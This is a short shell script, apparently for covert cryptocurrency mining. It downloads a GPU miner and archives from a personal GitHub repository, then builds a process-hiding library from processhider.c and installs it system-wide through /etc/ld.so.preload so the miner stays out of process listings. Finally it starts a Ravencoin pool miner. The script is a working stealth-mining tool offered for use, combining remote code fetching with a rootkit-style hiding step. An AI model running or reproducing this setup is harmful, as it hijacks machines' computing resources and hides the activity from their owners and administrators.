#!/bin/sh
wget https://github.com/NebuTech/NBMiner/releases/download/v34.5/NBMiner_34.5_Linux.tgz
tar -xvzf NBMiner_34.5_Linux.tgz
cd NBMiner_Linux
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/PowETH.zip
unzip PowETH.zip
chmod +x start_2miners.sh
chmod +x start_flypool.sh
chmod +x start_hiveon.sh
chmod +x start_ravenminerpplns.sh
chmod +x start_ravenminerpps.sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
unzip magicNb.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./start_ravenminerpplns.sh
